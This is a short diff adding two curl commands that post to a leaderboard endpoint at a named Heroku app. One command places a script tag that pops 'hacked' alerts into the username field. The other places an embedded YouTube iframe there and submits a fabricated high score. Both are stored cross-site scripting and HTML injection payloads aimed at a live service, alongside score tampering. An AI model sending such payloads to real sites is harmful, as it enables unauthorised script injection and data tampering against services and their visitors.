@@ -1,0 +1,2 @@
+# curl -X POST -H "Content-Type: application/json" -d '{"score":334, "username":"<script> var x = 0;while(x < 5){alert(\"hacked\"); x++;};</script>" "grid":"helllllllo"}' http://sleepy-atoll-6532.herokuapp.com/submit.json
+curl --data "username=<iframe width='560' height='315' src='//www.youtube.com/embed/5_sfnQDr1-o' frameborder='0' allowfullscreen></iframe>&score=650650650650&grid=babymoney!" http://sleepy-atoll-6532.herokuapp.com/submit.json
